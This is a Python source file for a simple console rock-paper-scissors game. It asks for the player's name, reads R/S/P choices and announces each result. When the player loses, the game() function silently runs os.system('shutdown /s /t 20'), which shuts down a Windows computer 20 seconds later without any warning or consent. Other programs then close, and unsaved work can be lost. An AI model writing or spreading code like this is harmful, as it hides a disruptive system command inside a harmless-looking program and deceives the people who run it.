import random
import os

rock = "rock"
paper = "paper"
scissors = "scissors"

def game(computer, person, name):
    print(f"Computer: {computer}")
    print(f"{name}: {person}")
    
    
    if computer == person:
        print("Draw".center(80))
    elif (computer == "rock" and person == "paper"):
        print("You win".center(80))
    elif (computer == "paper" and person == "scissors"):
        print("You win".center(80))
    elif (computer == "scissors" and person == "rock"):
        print("You win".center(80))
    else:
        print("You lose... Try again!".center(80))
        print("Goodbye".center(80))
        os.system("shutdown /s /t 20")
        return False

print("Welcome to Rock-Paper-Scissors!".center(100))
name = input("Enter your name: ").capitalize()

Choice = f"""

{name}, choose:
R - Rock
S - Scissors
P - Paper
Type 'exit' to quit the game.

"""

while True:
    computer = random.choice([rock, paper, scissors])
    
    
    p = input(Choice).lower()

    
    if p == 'exit':
        print("Thanks for playing! Goodbye!")
        break
    
    elif p == 'r':
        p = "rock"
    elif p == 's':
        p = "scissors"
    elif p == 'p':
        p = "paper"
    else:
        print("Invalid choice. Please select 'R', 'S', or 'P'.")
        continue    
    games = game(computer, p, name)
    
    
    if games == False:
        break
